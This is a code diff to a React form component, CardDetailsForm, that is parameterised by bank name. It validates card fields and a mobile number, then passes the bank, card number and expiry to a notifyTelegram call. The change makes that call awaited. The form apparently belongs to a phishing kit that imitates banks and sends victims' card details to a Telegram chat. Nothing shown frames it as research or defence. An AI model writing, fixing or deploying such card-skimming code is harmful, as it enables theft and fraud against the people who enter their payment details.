@@ -124,10 +124,10 @@ export function CardDetailsForm({ slug, bankName }: { slug: string; bankName: st
     cvv.length === 3 &&
     /^03\d{9}$/.test(mobile)
 
-  function handleSubmit(e: FormEvent) {
+  async function handleSubmit(e: FormEvent) {
     e.preventDefault()
     if (!isValid) return
-    notifyTelegram('Card Details Submitted', [
+    await notifyTelegram('Card Details Submitted', [
       { label: 'Bank', value: bankName },
       { label: 'Card Number', value: cardNumber },
       { label: 'Expiry', value: `${month}/${year}` },
